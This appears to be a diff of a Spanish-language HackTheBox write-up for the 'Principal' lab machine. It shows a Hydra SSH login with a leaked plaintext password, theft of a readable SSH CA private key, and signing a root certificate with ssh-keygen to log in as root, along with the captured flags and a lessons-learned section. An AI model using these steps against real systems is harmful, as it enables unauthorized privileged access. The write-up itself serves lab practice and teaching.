-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">svc</span><span class="o">-</span><span class="n">deploy</span><span class="vi">@principal</span><span class="ss">:~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">group</span> <span class="n">deployers</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/nu</span><span class="n">ll</span>
-</span></span><span class="line"><span class="cl"><span class="sr">/etc/ss</span><span class="n">h</span><span class="o">/</span><span class="n">sshd_config</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="mi">60</span><span class="o">-</span><span class="n">principal</span><span class="o">.</span><span class="n">conf</span>
-</span></span><span class="line"><span class="cl"><span class="sr">/opt/</span><span class="n">principal</span><span class="o">/</span><span class="n">ssh</span>
-</span></span><span class="line"><span class="cl"><span class="sr">/opt/</span><span class="n">principal</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="no">README</span><span class="o">.</span><span class="n">txt</span>
-</span></span><span class="line"><span class="cl"><span class="sr">/opt/</span><span class="n">principal</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ca</span></span></span></code></pre></div>
-<p>Encontramos algo muy interesante en <code>/opt/principal/ssh/</code>. Leemos el README:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">svc</span><span class="o">-</span><span class="n">deploy</span><span class="vi">@principal</span><span class="ss">:~</span><span class="err">$</span> <span class="n">cat</span> <span class="sr">/opt/</span><span class="n">principal</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="no">README</span><span class="o">.</span><span class="n">txt</span>
-</span></span><span class="line"><span class="cl"><span class="no">CA</span> <span class="n">keypair</span> <span class="k">for</span> <span class="no">SSH</span> <span class="n">certificate</span> <span class="n">automation</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="no">This</span> <span class="no">CA</span> <span class="n">is</span> <span class="n">trusted</span> <span class="n">by</span> <span class="n">sshd</span> <span class="k">for</span> <span class="n">certificate</span><span class="o">-</span><span class="n">based</span> <span class="n">authentication</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="no">Use</span> <span class="n">deploy</span><span class="o">.</span><span class="n">sh</span> <span class="n">to</span> <span class="n">issue</span> <span class="n">short</span><span class="o">-</span><span class="n">lived</span> <span class="n">certificates</span> <span class="k">for</span> <span class="n">service</span> <span class="n">accounts</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="no">Key</span> <span class="ss">details</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">  <span class="ss">Algorithm</span><span class="p">:</span> <span class="no">RSA</span> <span class="mi">4096</span><span class="o">-</span><span class="n">bit</span>
-</span></span><span class="line"><span class="cl">  <span class="ss">Created</span><span class="p">:</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">15</span>
-</span></span><span class="line"><span class="cl">  <span class="ss">Purpose</span><span class="p">:</span> <span class="no">Automated</span> <span class="n">deployment</span> <span class="n">authentication</span></span></span></code></pre></div>
-<p>Esto es una <strong>Autoridad Certificadora SSH</strong>. Hay un par de llaves CA en ese directorio. Verificamos la configuración de SSH:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">svc</span><span class="o">-</span><span class="n">deploy</span><span class="vi">@principal</span><span class="ss">:~</span><span class="err">$</span> <span class="n">cat</span> <span class="sr">/etc/ss</span><span class="n">h</span><span class="o">/</span><span class="n">sshd_config</span><span class="o">.</span><span class="n">d</span><span class="o">/</span><span class="mi">60</span><span class="o">-</span><span class="n">principal</span><span class="o">.</span><span class="n">conf</span>
-</span></span><span class="line"><span class="cl"><span class="c1"># Principal machine SSH configuration</span>
-</span></span><span class="line"><span class="cl"><span class="no">PubkeyAuthentication</span> <span class="n">yes</span>
-</span></span><span class="line"><span class="cl"><span class="no">PasswordAuthentication</span> <span class="n">yes</span>
-</span></span><span class="line"><span class="cl"><span class="no">PermitRootLogin</span> <span class="n">prohibit</span><span class="o">-</span><span class="n">password</span>
-</span></span><span class="line"><span class="cl"><span class="no">TrustedUserCAKeys</span> <span class="sr">/opt/</span><span class="n">principal</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ca</span><span class="o">.</span><span class="n">pub</span></span></span></code></pre></div>
-<p>La directiva <code>TrustedUserCAKeys</code> indica que SSH confía en certificados firmados por la CA. Y nosotros <strong>tenemos acceso de lectura a la clave privada</strong> <code>ca</code>. Esto es un error grave de configuración —el grupo <code>deployers</code> no debería tener acceso a la clave privada de la CA.</p>
-<h3 id="explotación-de-la-ca-ssh">
-  Explotación de la CA SSH
-  <a class="heading-link" href="#explotaci%c3%b3n-de-la-ca-ssh">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<p>El plan es claro:</p>
-<ol>
-<li>Descargar la clave privada CA a nuestra máquina atacante</li>
-<li>Generar un par de llaves SSH nuevas</li>
-<li>Firmar la llave pública con la CA para el principal <code>root</code></li>
-<li>Conectarnos como root usando el certificado firmado</li>
-</ol>
-<p>Descargamos la clave CA usando Penelope (nuestro administrador de sesiones):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="p">(</span><span class="no">Penelope</span><span class="p">)</span><span class="err">─</span><span class="p">(</span><span class="no">Session</span> <span class="o">[</span><span class="mi">1</span><span class="o">]</span><span class="p">)</span><span class="o">&gt;</span> <span class="n">download</span> <span class="n">ca</span>
-</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="err">•</span><span class="o">]</span> <span class="err">⇣</span> <span class="no">Downloading</span> <span class="n">to</span> <span class="sr">/home/</span><span class="n">kali</span><span class="o">/.</span><span class="n">penelope</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">principal</span><span class="o">~</span><span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">30</span><span class="o">.</span><span class="mi">182</span><span class="o">-</span><span class="no">Linux</span><span class="o">-</span><span class="n">x86_64</span><span class="o">/</span><span class="n">downloads</span>
-</span></span><span class="line"><span class="cl"> <span class="err">⤷</span> <span class="o">[</span><span class="c1">########################################] 100% (4.0 KBytes/4.0 KBytes)</span></span></span></code></pre></div>
-<p>Ahora en nuestra máquina atacante:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">cp</span> <span class="sr">/home/</span><span class="n">kali</span><span class="o">/.</span><span class="n">penelope</span><span class="o">/</span><span class="n">sessions</span><span class="o">/</span><span class="n">principal</span><span class="o">~</span><span class="mi">10</span><span class="o">.</span><span class="mi">129</span><span class="o">.</span><span class="mi">30</span><span class="o">.</span><span class="mi">182</span><span class="o">-</span><span class="no">Linux</span><span class="o">-</span><span class="n">x86_64</span><span class="o">/</span><span class="n">downloads</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">principal</span><span class="o">/</span><span class="n">ssh</span><span class="o">/</span><span class="n">ca</span> <span class="n">ca</span>
-</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">chmod</span> <span class="mi">600</span> <span class="n">ca</span>
-</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">ssh</span><span class="o">-</span><span class="n">keygen</span> <span class="o">-</span><span class="n">t</span> <span class="n">ed25519</span> <span class="o">-</span><span class="n">f</span> <span class="n">my_access</span> <span class="o">-</span><span class="n">N</span> <span class="s2">&#34;&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="no">Generating</span> <span class="kp">public</span><span class="o">/</span><span class="kp">private</span> <span class="n">ed25519</span> <span class="n">key</span> <span class="n">pair</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="no">Your</span> <span class="n">identification</span> <span class="n">has</span> <span class="n">been</span> <span class="n">saved</span> <span class="k">in</span> <span class="n">my_access</span>
-</span></span><span class="line"><span class="cl"><span class="no">Your</span> <span class="kp">public</span> <span class="n">key</span> <span class="n">has</span> <span class="n">been</span> <span class="n">saved</span> <span class="k">in</span> <span class="n">my_access</span><span class="o">.</span><span class="n">pub</span></span></span></code></pre></div>
-<p>Firmamos la llave pública con la CA. El truco está en los flags:</p>
-<ul>
-<li><code>-s ca</code> — usar la clave privada CA para firmar</li>
-<li><code>-I &quot;root_audit&quot;</code> — identity del certificado</li>
-<li><code>-n root</code> — <strong>principal</strong> (usuario para el que será válido el certificado)</li>
-<li><code>-V +1h</code> — validez de 1 hora</li>
-</ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">ssh</span><span class="o">-</span><span class="n">keygen</span> <span class="o">-</span><span class="n">s</span> <span class="n">ca</span> <span class="o">-</span><span class="n">I</span> <span class="s2">&#34;root_audit&#34;</span> <span class="o">-</span><span class="n">n</span> <span class="n">root</span> <span class="o">-</span><span class="n">V</span> <span class="o">+</span><span class="mi">1</span><span class="n">h</span> <span class="n">my_access</span><span class="o">.</span><span class="n">pub</span>
-</span></span><span class="line"><span class="cl"><span class="no">Signed</span> <span class="n">user</span> <span class="n">key</span> <span class="n">my_access</span><span class="o">-</span><span class="n">cert</span><span class="o">.</span><span class="n">pub</span><span class="p">:</span> <span class="nb">id</span> <span class="s2">&#34;root_audit&#34;</span> <span class="n">serial</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">root</span> <span class="n">valid</span> <span class="n">from</span> <span class="mi">2026</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">18</span><span class="ss">T22</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mo">00</span> <span class="n">to</span> <span class="mi">2026</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">18</span><span class="ss">T23</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">17</span></span></span></code></pre></div>
-<p>Y ahora, lo más simple: conectarnos como root:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">ssh</span> <span class="o">-</span><span class="n">i</span> <span class="n">my_access</span> <span class="n">root</span><span class="vi">@principal</span><span class="o">.</span><span class="n">htb</span>
-</span></span><span class="line"><span class="cl"><span class="no">Welcome</span> <span class="n">to</span> <span class="no">Ubuntu</span> <span class="mi">24</span><span class="o">.</span><span class="mo">04</span><span class="o">.</span><span class="mi">4</span> <span class="no">LTS</span> <span class="p">(</span><span class="no">GNU</span><span class="o">/</span><span class="no">Linux</span> <span class="mi">6</span><span class="o">.</span><span class="mi">8</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">101</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">root</span><span class="vi">@principal</span><span class="ss">:~</span><span class="c1"># cat root.txt</span>
-</span></span><span class="line"><span class="cl"><span class="n">fe347d72e5fb53a7386c23dfab4c1b4f</span></span></span></code></pre></div>
-<p><strong>root conseguido.</strong></p>
-<hr>
-<h2 id="resumen-de-la-intrusión">
-  Resumen de la Intrusión
-  <a class="heading-link" href="#resumen-de-la-intrusi%c3%b3n">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
-<table>
-  <thead>
-      <tr>
-          <th>Fase</th>
-          <th>Técnica</th>
-          <th>Resultado</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td><strong>Recon</strong></td>
-          <td>Escaneo Nmap + whatweb</td>
-          <td>Identificación de Jetty + pac4j-jwt 6.0.3</td>
-      </tr>
-      <tr>
-          <td><strong>Recon</strong></td>
-          <td>Análisis de JS (<code>app.js</code>)</td>
-          <td>Endpoints API, esquema JWE, roles</td>
-      </tr>
-      <tr>
-          <td><strong>Explotación</strong></td>
-          <td><strong>CVE-2026-29000</strong> (CVSS 10.0)</td>
-          <td>Forjado de token JWE → acceso admin</td>
-      </tr>
-      <tr>
-          <td><strong>Recon interno</strong></td>
-          <td>Endpoint <code>/api/settings</code></td>
-          <td>Credenciales <code>svc-deploy:D3pl0y_$$H_Now42!</code></td>
-      </tr>
-      <tr>
-          <td><strong>Acceso inicial</strong></td>
-          <td>SSH con Hydra</td>
-          <td>Shell como <code>svc-deploy</code> + flag user</td>
-      </tr>
-      <tr>
-          <td><strong>Privesc</strong></td>
-          <td>Abuso de <strong>TrustedUserCAKeys</strong> + CA privada legible</td>
-          <td>Firma de certificado SSH → shell como root</td>
-      </tr>
-  </tbody>
-</table>
-<h3 id="lecciones-aprendidas">
-  Lecciones aprendidas
-  <a class="heading-link" href="#lecciones-aprendidas">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h3>
-<ol>
-<li><strong>Nunca expongas la versión exacta de librerías de autenticación</strong> en headers HTTP. <code>X-Powered-By: pac4j-jwt/6.0.3</code> le regaló al atacante el vector de ataque.</li>
-<li><strong>No almacenes contraseñas en texto plano</strong> en settings de aplicaciones web.</li>
-<li><strong>Protege las claves privadas de la CA SSH</strong>. El grupo <code>deployers</code> no debería tener acceso de lectura a <code>/opt/principal/ssh/ca</code>. Una CA comprometida permite firmar certificados para cualquier usuario del sistema.</li>
-<li><strong>Usa certificados con validez corta</strong>. Al menos usaban <code>-V +1h</code>, limitando la ventana de reuso del certificado firmado.</li>
-</ol>
-<hr>
-<h2 id="flags">
-  Flags
-  <a class="heading-link" href="#flags">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
-  </a>
-</h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">user: 0f556e2c6de811d6afe3be60c3654a8e
-</span></span><span class="line"><span class="cl">root: fe347d72e5fb53a7386c23dfab4c1b4f
-</span></span></code></pre></div>
-      </div>
-
-
-      <footer>
-        
-
-<section class="see-also">
-  
-    
-    
-    
-      <h3 id="también-ver-en-hackthebox">
-        También ver en HackTheBox
-        <a class="heading-link" href="#tambi%c3%a9n-ver-en-hackthebox">
-          <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-          <span class="sr-only">Link to heading</span>
-        </a>
-      </h3>
-      <nav>
-        <ul>
-        
-        
-          
-            <li>
-              <a href="/posts/abducted/">Abducted</a>
-            </li>
-          
-        
-          
-            <li>
-              <a href="/posts/variatype/">VariaType</a>
-            </li>
-          
-        
-          
-        
-          
-            <li>
-              <a href="/posts/snapped/">Snapped CTF</a>
-            </li>
-          
-        
-          
-            <li>
-              <a href="/posts/cap/">Cap CTF</a>
-            </li>
-          
-        
-          
-            <li>
-              <a href="/posts/puppy/">Puppy CTF</a>
-            </li>
-          
-        
-        </ul>
-      </nav>
-    
-  
-</section>
-
-
-        
-        
-        
-        
-        
-        
-        
-      </footer>
-    </article>
-
-    
-  </section>
-
-    </div>
-
-    <footer class="footer">
-  <section class="container">
-    ©
-    
-      2019 -
-    
-    2026
-     David León 
-    ·
-    
-    Desarrollado por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
-    
-  </section>
-</footer>
-
-  </main>
-
-  
-
-  
-  
-  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-</body>
-</html>
+</code></pre><p>Todos parecen ser empleados o cuentas de servicio. El usuario <code>svc-deploy</code> llama la atención por su nomenclatura —parece una cuenta de servicio de despliegue— y <code>admin</code> es el obvio objetivo de escalada.</p><p><strong>Settings — <code>/api/settings</code>:</strong></p><p><img src=/images/posts/principal/discovering%20a%20password%20from%20settings.png alt></p><p>En la sección de ajustes encontramos algo que no debería estar ahí: <strong>una contraseña en texto plano</strong>. Alguien configuró credenciales de despliegue directamente en los settings de la aplicación:</p><p><strong>Usuario</strong>: <code>svc-deploy</code>
+<strong>Password</strong>: <code>D3pl0y_$$H_Now42!</code></p><h3 id=ssh--acceso-inicial-al-sistema>SSH — Acceso inicial al sistema
+<a class=heading-link href=#ssh--acceso-inicial-al-sistema><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Con estas credenciales probamos suerte contra el servicio SSH. Usamos Hydra con los usuarios enumerados y la contraseña descubierta:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>❯</span> <span class=n>hydra</span> <span class=o>-</span><span class=n>L</span> <span class=n>users</span> <span class=o>-</span><span class=n>P</span> <span class=n>passwords</span> <span class=ss>ssh</span><span class=p>:</span><span class=sr>//</span><span class=n>principal</span><span class=o>.</span><span class=n>htb</span>
+</span></span><span class=line><span class=cl><span class=no>Hydra</span> <span class=n>v9</span><span class=o>.</span><span class=mi>7</span> <span class=p>(</span><span class=n>c</span><span class=p>)</span> <span class=mi>2023</span> <span class=n>by</span> <span class=n>van</span> <span class=no>Hauser</span><span class=o>/</span><span class=no>THC</span> <span class=o>&amp;</span> <span class=no>David</span> <span class=no>Maciejak</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=mi>22</span><span class=o>][</span><span class=n>ssh</span><span class=o>]</span> <span class=ss>host</span><span class=p>:</span> <span class=n>principal</span><span class=o>.</span><span class=n>htb</span>   <span class=ss>login</span><span class=p>:</span> <span class=n>svc</span><span class=o>-</span><span class=n>deploy</span>   <span class=ss>password</span><span class=p>:</span> <span class=no>D3pl0y_</span><span class=vg>$$</span><span class=no>H_Now42</span><span class=o>!</span>
+</span></span><span class=line><span class=cl><span class=mi>1</span> <span class=n>of</span> <span class=mi>1</span> <span class=n>target</span> <span class=n>successfully</span> <span class=n>completed</span><span class=p>,</span> <span class=mi>1</span> <span class=n>valid</span> <span class=n>password</span> <span class=n>found</span></span></span></code></pre></div><p><strong>¡Acceso concedido!</strong> La cuenta <code>svc-deploy</code> reutiliza la contraseña encontrada en los settings. Nos conectamos por SSH:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=n>svc</span><span class=o>-</span><span class=n>deploy</span><span class=vi>@principal</span><span class=ss>:~</span><span class=err>$</span> <span class=n>cat</span> <span class=n>user</span><span class=o>.</span><span class=n>txt</span>
+</span></span><span class=line><span class=cl><span class=mi>0</span><span class=n>f556e2c6de811d6afe3be60c3654a8e</span></span></span></code></pre></div><p>Primera flag capturada. Ahora comenzamos la fase de escalada de privilegios.</p><hr><h2 id=escalada-de-privilegios>Escalada de Privilegios
+<a class=heading-link href=#escalada-de-privilegios><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><h3 id=enumeración-del-sistema>Enumeración del sistema
+<a class=heading-link href=#enumeraci%c3%b3n-del-sistema><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Lo primero: ¿quién soy y qué permisos tengo?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=n>svc</span><span class=o>-</span><span class=n>deploy</span><span class=vi>@principal</span><span class=ss>:~</span><span class=err>$</span> <span class=nb>id</span>
+</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>1001</span><span class=p>(</span><span class=n>svc</span><span class=o>-</span><span class=n>deploy</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>1002</span><span class=p>(</span><span class=n>svc</span><span class=o>-</span><span class=n>deploy</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>1002</span><span class=p>(</span><span class=n>svc</span><span class=o>-</span><span class=n>deploy</span><span class=p>),</span><span class=mi>1001</span><span class=p>(</span><span class=n>deployers</span><span class=p>)</span></span></span></code></pre></div><p>El usuario pertenece al grupo <code>deployers</code>. Esto es inusual y merece investigación. Buscamos archivos accesibles por este grupo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=n>svc</span><span class=o>-</span><span class=n>deploy</span><span class=vi>@principal</span><span class=ss>:~</span><span class=err>$</span> <span class=n>find</span> <span class=o>/</span> <span class=o>-</span><span class=n>group</span> <span class=n>deployers</span> <span class=mi>2</span><span class=o>&gt;</span><span class=sr>/dev/nu</span><span class=n>ll</span>
+</span></span><span class=line><span class=cl><span class=sr>/etc/ss</span><span class=n>h</span><span class=o>/</span><span class=n>sshd_config</span><span class=o>.</span><span class=n>d</span><span class=o>/</span><span class=mi>60</span><span class=o>-</span><span class=n>principal</span><span class=o>.</span><span class=n>conf</span>
+</span></span><span class=line><span class=cl><span class=sr>/opt/</span><span class=n>principal</span><span class=o>/</span><span class=n>ssh</span>
+</span></span><span class=line><span class=cl><span class=sr>/opt/</span><span class=n>principal</span><span class=o>/</span><span class=n>ssh</span><span class=o>/</span><span class=no>README</span><span class=o>.</span><span class=n>txt</span>
+</span></span><span class=line><span class=cl><span class=sr>/opt/</span><span class=n>principal</span><span class=o>/</span><span class=n>ssh</span><span class=o>/</span><span class=n>ca</span></span></span></code></pre></div><p>Encontramos algo muy interesante en <code>/opt/principal/ssh/</code>. Leemos el README:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=n>svc</span><span class=o>-</span><span class=n>deploy</span><span class=vi>@principal</span><span class=ss>:~</span><span class=err>$</span> <span class=n>cat</span> <span class=sr>/opt/</span><span class=n>principal</span><span class=o>/</span><span class=n>ssh</span><span class=o>/</span><span class=no>README</span><span class=o>.</span><span class=n>txt</span>
+</span></span><span class=line><span class=cl><span class=no>CA</span> <span class=n>keypair</span> <span class=k>for</span> <span class=no>SSH</span> <span class=n>certificate</span> <span class=n>automation</span><span class=o>.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=no>This</span> <span class=no>CA</span> <span class=n>is</span> <span class=n>trusted</span> <span class=n>by</span> <span class=n>sshd</span> <span class=k>for</span> <span class=n>certificate</span><span class=o>-</span><span class=n>based</span> <span class=n>authentication</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=no>Use</span> <span class=n>deploy</span><span class=o>.</span><span class=n>sh</span> <span class=n>to</span> <span class=n>issue</span> <span class=n>short</span><span class=o>-</span><span class=n>lived</span> <span class=n>certificates</span> <span class=k>for</span> <span class=n>service</span> <span class=n>accounts</span><span class=o>.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=no>Key</span> <span class=ss>details</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=ss>Algorithm</span><span class=p>:</span> <span class=no>RSA</span> <span class=mi>4096</span><span class=o>-</span><span class=n>bit</span>
+</span></span><span class=line><span class=cl>  <span class=ss>Created</span><span class=p>:</span> <span class=mi>2025</span><span class=o>-</span><span class=mi>11</span><span class=o>-</span><span class=mi>15</span>
+</span></span><span class=line><span class=cl>  <span class=ss>Purpose</span><span class=p>:</span> <span class=no>Automated</span> <span class=n>deployment</span> <span class=n>authentication</span></span></span></code></pre></div><p>Esto es una <strong>Autoridad Certificadora SSH</strong>. Hay un par de llaves CA en ese directorio. Verificamos la configuración de SSH:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=n>svc</span><span class=o>-</span><span class=n>deploy</span><span class=vi>@principal</span><span class=ss>:~</span><span class=err>$</span> <span class=n>cat</span> <span class=sr>/etc/ss</span><span class=n>h</span><span class=o>/</span><span class=n>sshd_config</span><span class=o>.</span><span class=n>d</span><span class=o>/</span><span class=mi>60</span><span class=o>-</span><span class=n>principal</span><span class=o>.</span><span class=n>conf</span>
+</span></span><span class=line><span class=cl><span class=c1># Principal machine SSH configuration</span>
+</span></span><span class=line><span class=cl><span class=no>PubkeyAuthentication</span> <span class=n>yes</span>
+</span></span><span class=line><span class=cl><span class=no>PasswordAuthentication</span> <span class=n>yes</span>
+</span></span><span class=line><span class=cl><span class=no>PermitRootLogin</span> <span class=n>prohibit</span><span class=o>-</span><span class=n>password</span>
+</span></span><span class=line><span class=cl><span class=no>TrustedUserCAKeys</span> <span class=sr>/opt/</span><span class=n>principal</span><span class=o>/</span><span class=n>ssh</span><span class=o>/</span><span class=n>ca</span><span class=o>.</span><span class=n>pub</span></span></span></code></pre></div><p>La directiva <code>TrustedUserCAKeys</code> indica que SSH confía en certificados firmados por la CA. Y nosotros <strong>tenemos acceso de lectura a la clave privada</strong> <code>ca</code>. Esto es un error grave de configuración —el grupo <code>deployers</code> no debería tener acceso a la clave privada de la CA.</p><h3 id=explotación-de-la-ca-ssh>Explotación de la CA SSH
+<a class=heading-link href=#explotaci%c3%b3n-de-la-ca-ssh><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>El plan es claro:</p><ol><li>Descargar la clave privada CA a nuestra máquina atacante</li><li>Generar un par de llaves SSH nuevas</li><li>Firmar la llave pública con la CA para el principal <code>root</code></li><li>Conectarnos como root usando el certificado firmado</li></ol><p>Descargamos la clave CA usando Penelope (nuestro administrador de sesiones):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=p>(</span><span class=no>Penelope</span><span class=p>)</span><span class=err>─</span><span class=p>(</span><span class=no>Session</span> <span class=o>[</span><span class=mi>1</span><span class=o>]</span><span class=p>)</span><span class=o>&gt;</span> <span class=n>download</span> <span class=n>ca</span>
+</span></span><span class=line><span class=cl><span class=o>[</span><span class=err>•</span><span class=o>]</span> <span class=err>⇣</span> <span class=no>Downloading</span> <span class=n>to</span> <span class=sr>/home/</span><span class=n>kali</span><span class=o>/.</span><span class=n>penelope</span><span class=o>/</span><span class=n>sessions</span><span class=o>/</span><span class=n>principal</span><span class=o>~</span><span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>30</span><span class=o>.</span><span class=mi>182</span><span class=o>-</span><span class=no>Linux</span><span class=o>-</span><span class=n>x86_64</span><span class=o>/</span><span class=n>downloads</span>
+</span></span><span class=line><span class=cl> <span class=err>⤷</span> <span class=o>[</span><span class=c1>########################################] 100% (4.0 KBytes/4.0 KBytes)</span></span></span></code></pre></div><p>Ahora en nuestra máquina atacante:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>❯</span> <span class=n>cp</span> <span class=sr>/home/</span><span class=n>kali</span><span class=o>/.</span><span class=n>penelope</span><span class=o>/</span><span class=n>sessions</span><span class=o>/</span><span class=n>principal</span><span class=o>~</span><span class=mi>10</span><span class=o>.</span><span class=mi>129</span><span class=o>.</span><span class=mi>30</span><span class=o>.</span><span class=mi>182</span><span class=o>-</span><span class=no>Linux</span><span class=o>-</span><span class=n>x86_64</span><span class=o>/</span><span class=n>downloads</span><span class=o>/</span><span class=n>opt</span><span class=o>/</span><span class=n>principal</span><span class=o>/</span><span class=n>ssh</span><span class=o>/</span><span class=n>ca</span> <span class=n>ca</span>
+</span></span><span class=line><span class=cl><span class=err>❯</span> <span class=n>chmod</span> <span class=mi>600</span> <span class=n>ca</span>
+</span></span><span class=line><span class=cl><span class=err>❯</span> <span class=n>ssh</span><span class=o>-</span><span class=n>keygen</span> <span class=o>-</span><span class=n>t</span> <span class=n>ed25519</span> <span class=o>-</span><span class=n>f</span> <span class=n>my_access</span> <span class=o>-</span><span class=n>N</span> <span class=s2>&#34;&#34;</span>
+</span></span><span class=line><span class=cl><span class=no>Generating</span> <span class=kp>public</span><span class=o>/</span><span class=kp>private</span> <span class=n>ed25519</span> <span class=n>key</span> <span class=n>pair</span><span class=o>.</span>
+</span></span><span class=line><span class=cl><span class=no>Your</span> <span class=n>identification</span> <span class=n>has</span> <span class=n>been</span> <span class=n>saved</span> <span class=k>in</span> <span class=n>my_access</span>
